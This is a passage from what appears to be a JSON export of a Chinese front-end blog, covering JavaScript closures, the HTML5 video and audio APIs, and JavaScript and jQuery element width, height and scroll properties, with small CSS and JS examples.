id=\"list\"&gt; &lt;li&gt;01&lt;/li&gt; &lt;li&gt;02&lt;/li&gt; &lt;li&gt;03&lt;/li&gt; &lt;li&gt;04&lt;/li&gt;&lt;/ul&gt; 12345678var liDoms = document.getElementById(\"list\").getElementsByTagName(\"li\"); for(var i=0;i&lt;liDoms.length;i++)&#123; (function(a)&#123; liDoms[a].onclick = function()&#123; alert(a); &#125; &#125;)(i) &#125; 1234567891011121314151617181920212223242526//函数也是一种数据类型 它和 number string boolean object 特殊在可以打括号去执行它 //函数中的循环 function test()&#123; var arr = [],i; for(i=0;i&lt;3;i++)&#123; // arr[i] = (function fn(a)&#123; // return a; // &#125;)(i); arr[i] = fn(i); &#125; return arr; &#125; function fn(a)&#123; return a; &#125; var c = test(); //alert(c); for(var i=0;i&lt;c.length;i++)&#123; var value = c[i]; alert(value); &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"作用域","slug":"作用域","permalink":"https://ru23.com/tags/作用域/"}]},{"title":"HTML5中的视频音频使用详解","slug":"2016-12-video-audio","date":"2016-12-30T06:35:24.000Z","updated":"2018-10-24T03:46:02.015Z","comments":true,"path":"note/1c7bdfba.html","link":"","permalink":"https://ru23.com/note/1c7bdfba.html","excerpt":"一、video 1.1 video支持视频格式 常见的视频格式 视频的组成部分：画面、音频、编码格式 视频编码：H.264、Theora、VP8(google开源)","text":"一、video 1.1 video支持视频格式 常见的视频格式 视频的组成部分：画面、音频、编码格式 视频编码：H.264、Theora、VP8(google开源) HTML5支持的视频格式： Ogg 带有Theora视频编码+Vorbis音频编码的Ogg文件 支持的浏览器:F、C、O MEPG4 带有H.264视频编码+AAC音频编码的MPEG4文件 支持的浏览器: S、C WebM 带有VP8视频编码+Vorbis音频编码的WebM格式 支持的浏览器: I、F、C、O 劣势：视频少、转码器几乎没有，不好转码 想要video能自动填充慢父div的大小，只要给video标签加上style=&quot;width= 100%; height=100%; object-fit: fill&quot;即可 1.2 标签原型 指定一种视频格式，不能播就提示 12&lt;video id=\"media\" src=\"examp.mp4\" width=\"500\" poster=\"examp1.jpg\" &gt;您的浏览器不支持video&lt;/video&gt; 给定多种视频格式，浏览器根据自身支持程度选择播放哪一种 注意：多个source标签，浏览器会从第一个开始识别，如果第一个不被识别，则会继续识别第二个；如果第一个识别成功，则会直接播放第一种格式视频 123456789&lt;video controls = “controls”&gt; &lt;source src=”1.mp4” type=”video/mp4” /&gt; //src属性写到source标签中，要指定视频的type类型，例如MP4的即为type=“video/mp4” &lt;source src = “2.ogg” type=”video/ogg” /&gt; //ogg格式 &lt;source src=”3.webm” type=”video/webm” /&gt; //webm格式&lt;/video&gt; 1.3 重要的video标签属性 属性(常用) 值 功能描述 controls controls 是否显示播放控件 autoplay autoplay 设置是否打开浏览器后自动播放 width Pilex（像素） 设置播放器的宽度 height Pilex（像素） 设置播放器的高度 loop loop 设置视频是否循环播放（即播放完后继续重新播放） preload preload 设置是否等加载完再播放 src url 设置要播放视频的url地址 poster imgurl 设置播放器初始默认显示图片 autobuffer autobuffer 设置为浏览器缓冲方式，不设置autoply才有效 API 属性 属性 描述 audioTracks 返回表示可用音轨的 AudioTrackList 对象 buffered 返回表示音频/视频已缓冲部分的 TimeRanges 对象 controller 返回表示音频/视频当前媒体控制器的 MediaController 对象 crossOrigin 设置或返回音频/视频的 CORS 设置 currentSrc 返回当前音频/视频的 URL currentTime 设置或返回音频/视频中的当前播放位置（以秒计） defaultMuted 设置或返回音频/视频默认是否静音 defaultPlaybackRate 设置或返回音频/视频的默认播放速度 duration 返回当前音频/视频的长度（以秒计） ended 返回音频/视频的播放是否已结束 error 返回表示音频/视频错误状态的 MediaError 对象 mediaGroup 设置或返回音频/视频所属的组合（用于连接多个音频/视频元素） muted 设置或返回音频/视频是否静音 networkState 返回音频/视频的当前网络状态 paused 设置或返回音频/视频是否暂停 playbackRate 设置或返回音频/视频播放的速度 played 返回表示音频/视频已播放部分的 TimeRanges 对象 readyState 返回音频/视频当前的就绪状态 seekable 返回表示音频/视频可寻址部分的 TimeRanges 对象 seeking 返回用户是否正在音频/视频中进行查找 startDate 返回表示当前时间偏移的 Date 对象 textTracks 返回表示可用文本轨道的 TextTrackList 对象 videoTracks 返回表示可用视频轨道的 VideoTrackList 对象 volume 设置或返回音频/视频的音量 常用API属性 duration：返回当前音频/视频的长度（以秒计） paused：设置或返回音频/视频是否暂停 currentTime：设置或返回音频/视频中的当前播放位置（以秒计） ended：返回音频/视频的播放是否已结束 1.4 Video API 1.4.1 Video 方法 API 事件说明 play video.play(); 播放视频 pause video.pause(); 暂停播放视频 load video.load(); 将全部属性回复默认值，视频恢复重新开始状态 canPlayType var support = videoid.canPlayType(‘video/mp4′); 判断浏览器是否支持当前类型的视频格式返回值：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;空字符串：不支持Maybe：可能支持Probably：完全支持 常用方法 play()：开始播放音频/视频 pause()：暂停当前播放的音频/视频 1.4.2网络状态 获取video对象 1Media = document.getElementById(\"media\"); Media.currentSrc; 返回当前资源的URL Media.src = value; 返回或设置当前资源的URL Media.canPlayType(type); 是否能播放某种格式的资源 Media.networkState; 0.此元素未初始化 1.正常但没有使用网络 2.正在下载数据 3.没有找到资源 Media.load(); 重新加载src指定的资源 Media.buffered; 返回已缓冲区域，TimeRanges Media.preload; none:不预载 metadata:预载资源信息 auto: 1.4.3 准备状态 Media.readyState Media.seeking; 是否正在seeking 1.4.4 回放状态 Media.currentTime = value; 当前播放的位置，赋值可改变位置 Media.startTime; 一般为0，如果为流媒体或者不从0开始的资源，则不为0 Media.duration; 当前资源长度 流返回无限 Media.paused; 是否暂停 Media.defaultPlaybackRate = value; 默认的回放速度，可以设置 Media.playbackRate = value; 当前播放速度，设置后马上改变 Media.played; 返回已经播放的区域，TimeRanges，关于此对象见下文 Media.seekable; 返回可以seek的区域 TimeRanges Media.ended; 是否结束 Media.autoPlay; 是否自动播放 Media.loop; 是否循环播放 Media.play(); 播放 Media.pause(); 暂停 1.4.5 视频控制 Media.controls;//是否有默认控制条 Media.volume = value; //音量 Media.muted = value; //静音 TimeRanges(区域)对象 TimeRanges.length; //区域段数 TimeRanges.start(index) //第index段区域的开始位置 TimeRanges.end(index) //第index段区域的结束位置 1.4.6 相关事件 首先绑定事件的话可以通过js中的addEventListener方法来绑定事件 事件 说明 loadstart 客户端开始请求数据 progress 客户端正在请求数据 suspend 延迟下载 abort 客户端主动终止下载（不是因为错误引起） loadstart 客户端开始请求数据 progress 客户端正在请求数据 error 请求数据时遇到错误 stalled 网速失速 play play()和autoplay开始播放时触发 pause pause()触发 loadedmetadata 成功获取资源长度 loadeddata - waiting 等待数据，并非错误 playing 开始回放 canplay 可以播放，但中途可能因为加载而暂停 canplaythrough 可以播放，歌曲全部加载完毕 seeking 寻找中 seeked 寻找完毕 timeupdate 播放时间改变 ended 播放结束 ratechange 播放速率改变 durationchange 资源长度改变 volumechange 音量改变 常用事件 oncanplay：当文件就绪可以开始播放时运行的脚本（缓冲已足够开始时）。 ontimeupdate： 当播放位置改变时（比如当用户快进到媒介中一个不同的位置时）运行的脚本。 onended：当媒介已到达结尾时运行的脚本（可发送类似“感谢观看”之类的消息）。 1.4.7 其他 全屏: element.webkitRequestFullScreen();( webkit) element.mozRequestFullScreen(); (Firefox ) element.requestFullscreen(); (W3C ) 退出全屏： document.webkitCancelFullScreen(); (webkit ) document.mozCancelFullScreen(); (Firefox) document.exitFullscreen(); (W3C) 二、audio 2.1 audio格式 常见的音频格式 音频编码：ACC、MP3、Vorbis HTML5支持的音频格式： Ogg 免费 支持的浏览器:C、F、O MP3 收费 支持的浏览器: I、C、S Wav 收费 支持的浏览器: F、O、S 2.2 audio标签中的一些常用属性 属性 属性值 注释 src url 播放的音乐的url地址（火狐只支持ogg的音乐，而IE9只支持MP3格式的音乐。chrome貌似全支持） preload preload 预加载（在页面被加载时进行加载或者说缓冲音频），如果使用了autoplay的话那么该属性失效。 loop loop 循环播放 controls controls 是否显示默认控制条（控制按钮） autoplay autoplay 自动播放 对于音乐格式的支持 音频格式 Chrome Firefox IE9 Opera Safari OGG 支持 支持 支持 不支持 不支持 MP3 支持 不支持 支持 不支持 支持 WAV 不支持 支持 不支持 支持 不支持 audio可通过new来创建。也可以通过用document来获取 123456//通过new关键字来创建Audio对象var Music = new Audio(\"test.mp3\");//通过document来获取已经存在的Audio对象var Music = document.getElementById(\"audio\");//当然这里也可以使用document.getElementsByClassName('className')等其他的方法来获取。 2.3 api所提供的对audio标签操作的一些属性和方法 属性 注释 duration 获取媒体文件的总时长，以s为单位，如果无法获取，返回NaN paused 如果媒体文件被暂停，那么paused属性返回true，反之则返回false ended 如果媒体文件播放完毕返回true muted 用来获取或设置静音状态。值为boolean volume 控制音量的属性值为0-1;0为音量最小，1为音量最大 startTime 返回起始播放时间 error 返回错误代码，为uull的时候为正常。否则可以通过Music.error.code来获取 currentTime 用来获取或控制当前播放的时间，单位为s。 currentSrc 以字符串形式返回正在播放或已加载的文件 2.4 常用的控制用的函数 函数 作用 load() 加载音频、视频软件 play() 加载并播放音频、视频文件或重新播放暂停的的音频、视频 pause() 暂停出于播放状态的音频、视频文件 canPlayType(obj) 测试是否支持给定的Mini类型的文件 2.5 audio标签API中的常用事件 首先绑定事件的话可以通过js中的addEventListener方法来绑定事件 事件名称 事件作用 loadstart 客户端开始请求数据 progress 客户端正在请求数据（或者说正在缓冲） play play()和autoplay播放时 pause pause()方法促发时 ended 当前播放结束 timeupdate 当前播放时间发生改变的时候。播放中常用的时间处理 canplaythrough 歌曲已经载入完全完成 canplay 缓冲至目前可播放状态。 其实video的api和audio几乎一致。稍稍有点不同。所以基本上会了一个其他的也就都会了","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://ru23.com/tags/HTML5/"},{"name":"video","slug":"video","permalink":"https://ru23.com/tags/video/"}]},{"title":"JavaScript及jQuery中的各种宽高属性图解","slug":"2016-12-js-props","date":"2016-12-13T15:35:24.000Z","updated":"2018-10-24T09:45:20.377Z","comments":true,"path":"note/ae4d3c59.html","link":"","permalink":"https://ru23.com/note/ae4d3c59.html","excerpt":"原文链接 http://blog.poetries.top/2016/12/13/js-props声明：本文根据慕课网学习视频整理 强烈建议打开控制台自己动手练习一遍，这样印象才会深刻 第一部分 JavaScript中的宽高属性 一、与window相关的宽高属性 1.1 window.location和document.location window对象的location属性引用的是location对象，表示该窗口中当前显示文档的URL document的对象的location属性也是引用location对象 所以 window.location === document.location //true","text":"原文链接 http://blog.poetries.top/2016/12/13/js-props声明：本文根据慕课网学习视频整理 强烈建议打开控制台自己动手练习一遍，这样印象才会深刻 第一部分 JavaScript中的宽高属性 一、与window相关的宽高属性 1.1 window.location和document.location window对象的location属性引用的是location对象，表示该窗口中当前显示文档的URL document的对象的location属性也是引用location对象 所以 window.location === document.location //true 1.2 window.screen window.screen包含有关用户屏幕的信息。它包括： window.screen.width window.screen.height window.screen.availHeight window.screen.availWidth window.screenTop window.screenLeft 1.3 与window相关的宽高 window.innerWidth 内部的宽度 window.innerHeight 内部的高度 window.outWidth 外部的宽度 window.outHeight 外部的高度 二、与document相关的宽高属性 2.1与client相关的宽高 document.body.clientWidth 元素宽度（可视内容区+内边距） document.body.clientHeight元素高度（可视内容区+内边距） 该属性指的是元素的可视部分宽度和高度，即padding+content如果没有滚动条，即为元素设定的宽度和高度如果出现滚动条，滚动条会遮盖元素的宽高，那么该属性就是其本来宽高减去滚动条的宽高 example1： 1234567891011body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125; console.log(document.body.clientWidth); // 350+padding(80) = 430console.log(document.body.clientHeight); // 500 + padding(80) = 580 example2: 在div中添加文字， 指导出现滚动条 123456789101112#exp2 &#123; width:200px; height:200px; background:red; border:1px solid #000; overflow:auto;&#125;var test = document.getElementById(\"exp2\");console,log(test.clientHeight); // 200console.log(test.clientWidth); // window7下test.clientWidth 小结clientWidth和clientHeight 无padding无滚动 ： clientWidth = 盒子的width 有padding无滚动 ： clientWidth = 盒子的width + 盒子的padding * 2 有padding有滚动 ： clientWidth = 盒子和width + 盒子的padding * 2- 滚动轴宽度 document.body.clientLeft document.body.clientTop 这两个返回的是元素周围边框的厚度，如果不指定一个边框或者不定位该元素，它的值就是0 例： 1234567891011body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125; console.log(document.body.clientLeft); // 20console.log(document.body.clientTop); // 20 小结clientLeft和clientTop 这一对属性是用来读取元素的border的宽度和高度的 clientTop = border-top clientLeft = border-left 2.2 与offset相关的宽高 document.body.offsetWidth（元素的border+padding+content的宽度） document.body.offsetHeight（元素的border+padding+content的高度） 该属性和其内部的内容是否超出元素大小无关，只和本来设定的border以及width和height有关 例： 1234567891011body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125; console.log(document.body.offsetWidth); // 470 = padding*2 + 350 + border*2console.log(document.body.offsetHeight); // 620 = padding*2 + 500 + border*2 小结offsetWidth和offsetHeight 无padding无滚动无border offsetWidth = clientWidth = 盒子的宽度 有padding无滚动有border offsetWidth = 盒子的宽度 + 盒子padding2 + 盒子边框2 = clientWidth + 边框宽度*2 有padding有滚动，且滚动是显示的，有border offsetWidth = 盒子宽度 + 盒子padding2 + 盒子边框2 = clientWidth + 滚动轴宽度 + 边框宽度*2 document.offsetLeft document.offsetTop 了解这两个属性我们必须先了解它，什么是offsetParent 如果当前元素的父级元素没有进行CSS定位（position为absolute或relative）,offsetParent为body. 假如当前元素的父级元素中有CSS定位，offsetParent取最近的那个父级元素 offsetLeft的兼容性问题： 在IE6/7中 offsetLeft = offsetParent的padding-left + 当前元素的margin-left 在IE8/9/10以及chrome中 offsetLeft = offsetParent的margin-left + offsetParent的border宽度 + offsetParent的padding-left + 当前元素的margin-left 在FireFox中 offsetLeft = offsetParent的margin-left + 当前元素的margin-left + offsetParent的padding-left 例： 1234567891011121314151617181920body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125; #exp &#123; width:400px; height:200px; padding:20px; margin:10px; background:red; border:20px solid #000; overflow:auto;&#125;var div = document.getElementById(\"exp\"); 在IE8/9/10以及chrome中： div.offsetLeft = 本身的margin10 + 父级元素的padding40 + margin10 + border20 = 80 div.offsetTop = 本身的margin10 + 父级元素的padding40 + margin10 + border20 = 80 在FireFox：（相比chrome中少了border） div.offsetLeft = 本身的margin10 + 父级元素的padding40 + margin10 = 60 div.offsetTop = 本身的margin10 + 父级元素的padding40 + margin10 = 60 在IE6/7中：（相比在FireFox，不但少了border还少了父级元素的margin） div.offsetLeft = 本身的margin10 + 父级元素的padding40 = 50 div.offsetTop = 本身的margin10 + 父级元素的padding40 = 50 2.3与scroll相关的宽高 (实际项目中用的最多) document.body.scrollWidth document.body.scrollHeight document.body的scrollWidth和scrollHeight与div的scrollWidth和scrollHeight是有区别的 例： 123456789101112body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125;document.body.scrollHeight; // document.body.scrollWidth; // 当给定宽高小于浏览器窗口的宽高 scrollWidth = 通常是浏览器窗口的宽度 scrollHeight = 通常是浏览器窗口的高度 当给定宽高大于浏览器窗口的宽高，且内容小于给定宽高的时候 scrollWidth = 给定宽度 + 其所有的padding + margin + border scrollHeight = 给定高度 + 其所有的padding + margin + border 当给定宽高大于浏览器窗口宽高，且内容大于给定宽高 scrollWidth = 内容宽度 + 其所有的padding + margin + border scrollHeight = 内容高度 + 其所有的padding + margin + border 在某div中的scrollWidth和scrollHeight 无滚动轴时： scrollWidth = clientWidth = 盒子宽度 + 盒子padding*2 有滚动轴时： scrollWidth = 实际内容的宽度 + padding*2 scrollHeight = 实际内容的高度 + padding*2 document.body.scrollLeft document.body.scrollTop 与前面不同的是，这对属性是可读写的，指的是当元素其中的超出其宽高的时候，元素被卷起来的高度和宽度 12345678910111213141516171819#exp &#123; width:400px; height:200px; padding:20px; margin:10px; background:red; border:20px solid #000; overflow-y:scroll;&#125;var mydiv = document.getElementById(\"exp\");mydiv.scrollTop ; //默认情况下是0 mydiv.scrollLeft ; //默认情况下是0 //可以改写它mydiv.scrollTop = 20;console.log(mydiv.scrollTop) scrollTop和scrollLeft obj.style.width和obj.style.height 对于一个DOM元素，它的style属性返回的是一个对象，这个对象的任意一个属性是可读写的，style.width等于css属性中的宽度。style.height等于css属性中的高度 2.4 documentElement和body的关系 是父子级的关系 1234567891011121314151617181920212223body&#123; border: 20px solid #000; margin: 10px; padding: 40px; background: #eee; height: 350px; width: 500px; overflow: scroll; &#125;#exp &#123; width:400px; height:200px; padding:20px; margin:10px; background:red; border:20px solid #000; overflow-y:scroll;&#125;console.log(document); //documentconsole.log(document.documentElement); //htmlconsole.log(document.body); //body Paste_Image.png 兼容问题推荐使用 获取浏览器窗口可视区域大小 12document.body.clientWidth || document.documentElement.clientWidth;document.body.clientHeight || document.documentElement.clientHeight; 三、Event对象的5种坐标 Event对象的5种坐标 例： 12&lt;div id=\"example\" style=\"width: 200px;height: 200px;background: red;margin: 100px auto;\"&gt;&lt;/div&gt; 12345678var example = document.getElementById(\"example\");example.onclick = function(e)&#123; console.log(\"clientX \"+e.clientX + \" : \" + \" clientY \"+e.clientY); console.log(\"screenX \"+e.screenX + \" : \" + \" screenY \"+e.screenY); console.log(\"offsetX \"+e.offsetX + \" : \" + \" offsetY \"+e.offsetY); console.log(\"pageX \"+e.pageX + \" : \" + \" pageY \"+e.pageY); console.log(\"x \"+e.x + \" : \" + \" y \"+e.y);&#125; Event对象的5种坐标 四、 js各种宽高的应用 example1：可视区域加载 1&lt;div id=\"example1\" &gt;&lt;/div&gt; 123456789101112131415161718192021#example1 &#123; width: 500px; height: 350px; background: red; margin: 1000px auto 0 auto; &#125; @-webkit-keyframes fadeInLeft&#123; 0%&#123; opacity: 0; transform: translate3d(-100%,0,0); &#125; 100%&#123; opacity: 1; transform: none; &#125; &#125; .fadeInLeft &#123; animation-name: fadeInLeft; animation-duration: 2s; &#125; 123456789101112function showDiv()&#123; var example = document.getElementById(\"example\"); var clients = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;//可视区域的高度 var divTop = example.getBoundingClientRect().top; if(divTop &lt;= clients)&#123; example.classList.add(\"fadeInLeft\"); // 这里可以通过setAttribute设置图片的src按需加载 &#125; document.title = clients+\"---\"+divTop; &#125; window.onscroll = showDiv; 在线演示 example2：网页滚动到顶部或者底部 1&lt;div id=\"example2\" &gt;&lt;/div&gt; 123456#example2 &#123; width: 500px; height: 350px; background: red; margin: 1000px auto 0 auto;&#125; 12345678910111213141516function scrollTopOrBottom()&#123; var example2 = document.getElementById(\"example\"); var clients = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;//可视区域的高度，兼容性写法 var scrollTop = document.body.scrollTop; var wholeHeight = document.body.scrollHeight; if(clients + scrollTop &gt;= wholeHeight)&#123; alert(\"我已经到了底部!\"); // 这里可以调用Ajax分页加载到页面中，实现多页加载功能 &#125;else if(scrollTop == 0)&#123; alert(\"我已经到了顶部了!\"); &#125; document.title = (clients + scrollTop)+\"---\"+wholeHeight+\"--\"+scrollTop; &#125; window.onscroll = scrollTopOrBottom; 在线演示 example3：DIV滚动到底部加载 12345678&lt;div id=\"example3\" &gt; DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载 DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载 DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载 DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载 DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载 DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载DIV滚动到底部加载&lt;/div&gt; 12345678#example3 &#123; width: 500px; height: 400px; background: red; margin: 10px auto; padding: 10px; overflow-y: scroll;&#125; 123456789101112131415161718var div = document.getElementById(\"example3\"); function divScroll()&#123; var wholeHeight = div.scrollHeight;//滚动区域高度 var divScrollTop = div.scrollTop;//卷上去的那部分高度 var divHeight = div.clientHeight; //div的可视区域的高度 if(divScrollTop + divHeight &gt;= wholeHeight)&#123; alert(\"我已经到了底部!\"); // 这里可以在div中通过滚动加载分页按需显示 &#125;else if(divScrollTop == 0)&#123; alert(\"我已经到了顶部了!\"); &#125; document.title = (divScrollTop + divHeight)+\"---\"+wholeHeight+\"--\"+divScrollTop;&#125; div.onscroll = divScroll; 在线演示 example4：计算滚动轴的宽度 123456789101112131415161718//获取滚动轴的宽度 function getScrollBar()&#123; var el = document.createElement(\"p\"); var styles = &#123; width:\"100px\", height:\"100px\", overflowY:\"scroll\" &#125;; for (var prop in styles)&#123; el.style[prop] = styles[prop];//把 styles上的属性全部遍历拷贝到el.style上 &#125; document.body.appendChild(el); var scrollBarWidth = el.offsetWidth - el.clientWidth; el.remove(); return scrollBarWidth; &#125; alert(getScrollBar());//17 在线演示 五、js中的宽高属性总结 Paste_Image.png document相关的宽高 第二部分 jQuery中的宽高属性 一、jquery相关宽高介绍 1.1 width() 特殊元素window.document只可以读，普通元素可以读写，width()返回结果无单位，css(&quot;width&quot;)的结果有单位 width 1.2 innerWidth() 包含padding（不推荐window,document调用） 1.3 innerHeight() innerWidth--innerHeight innerWidth 1.4 outerWidth() 包含padding和border，当传true时包含marging，不传时不包含marging（不推荐window,document调用） 1.5 outerHeight() outerWidth--outerHeight outerWidth 1.6 scrollLeft(): 相对于水平滚动条左边的距离，如果滚动条非常左、或者元素不能被滚动，这个值为0； 1.7 scrollTop(): 相对于垂直滚动条上边的距离，如果滚动条非常上、或者元素不能被滚动，这个值为0； 1.8 .offset(): 相对于document的当前坐标值(相对于body左上角的left,top的值)； 1.9 .position(): 相对于offset parent的当前坐标值(相对于offset parent元素的左上角的left、top的值) 二、jquery相关宽高举例 2.1 exmaple1 example1 123&lt;div class=\"parentDiv\"&gt; &lt;div class=\"childrenDiv\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122html,body &#123; margin:10px; border:5px solid red; padding:20px;&#125;.parentDiv &#123; width:800px; height:500px; margin:5px auto; background:#FF6600; border:5px dashed green;padding:30px;position:relative;&#125;.childrenDiv &#123; width:300px; height:500px; margin:5px auto; background:yellow; border:5px solid black; padding:5px; box-sizing:border-box;/*包括padding和border的值*/&#125; 1234567891011121314151617181920212223242526272829303132333435//特殊元素的高度//window documentconsole.log(\"$(window).height()\"+$(window).height());console.log(\"$(document).height()\"+$(document).height());//innerHeight console.log(\"$(window).innerHeight()\"+$(window).innerHeight());console.log(\"$(document).innerHeight()\"+$(document).innerHeight());//普通child元素的高度//480 = 500 - border*2 - padding*2 (因为设置了box-sizing，box-sizing把border和padding的值计算了进去)console.log('$(\".childrenDiv\").height()'+ $(\".childrenDiv\").height());//490 = 500 - border*2 - padding*2（innerHeight不包括padding）console.log('$(\".childrenDiv\").innerHeight()'+ $(\".childrenDiv\").innerHeight());//500 = 500 不包括marginconsole.log('$(\".childrenDiv\").outerHeight()'+ $(\".childrenDiv\").outerHeight());//510 = 500 + margin true包括marginconsole.log('$(\".childrenDiv\").outerHeight()'+ $(\".childrenDiv\").outerHeight(true));//scrollTop$(window).scroll(function()&#123; document.title = \"scrollTop \"+$(this).scrollTop();&#125;);// jquery宽高演示之offset和positionconsole.log('$(\".childrenDiv\").offset().top '+$(\".childrenDiv\").offset().top);console.log('$(\".childrenDiv\").offset().left '+$(\".childrenDiv\").offset().left);console.log('$(\".childrenDiv\").position().top '+$(\".childrenDiv\").position().top);console.log('$(\".childrenDiv\").position().top '+$(\".childrenDiv\").position().left); Paste_Image.png offset-position 在线演示 三、jquery各种宽高应用 3.1 jquery可视区域加载 1&lt;div id=\"example\" &gt;&lt;/div&gt; 123456789101112131415161718192021#example &#123; width: 500px; height: 350px; background: red; margin: 1000px auto 0 auto; &#125; @-webkit-keyframes fadeInLeft&#123; 0%&#123; opacity: 0; transform: translate3d(-100%,0,0); &#125; 100%&#123; opacity: 1; transform: none; &#125; &#125; .fadeInLeft &#123; animation-name: fadeInLeft; animation-duration: 2s; &#125; 12345678910$(window).scroll(function()&#123; var ks_area = $(window).height();//可视区域高度 var scrollHeight = $(window).scrollTop();//被卷上去的那部分 var divTop = $(\"#example\").offset().top;//盒子距离浏览器顶部的距离 if(ks_area + scrollHeight &gt;= divTop)&#123; $(\"#example\").addClass(\"fadeInLeft\"); &#125; document.title = ks_area+'-'+scrollHeight+'-'+divTop;&#125;); 在线演示 3.2 jquery滚动到底部和顶部加载 12&lt;div id=\"example\" &gt;&lt;/div&gt;&lt;script src=\"http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js\"&gt;&lt;/script&gt; 123456#example &#123; width: 500px; height: 350px; background: red; margin: 1000px auto 0 auto;&#125; 1234567891011$(window).scroll(function()&#123; var ks_area = $(window).height(); var scrollTop = $(window).scrollTop(); var wholeHeight = $(document).height(); if(ks_area + scrollTop &gt;=wholeHeight )&#123; alert(\"已经到底部了\"); &#125;else if(scrollTop == 0)&#123; alert(\"已经到头部了\"); &#125;&#125;) 在线演示 （完）","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JS 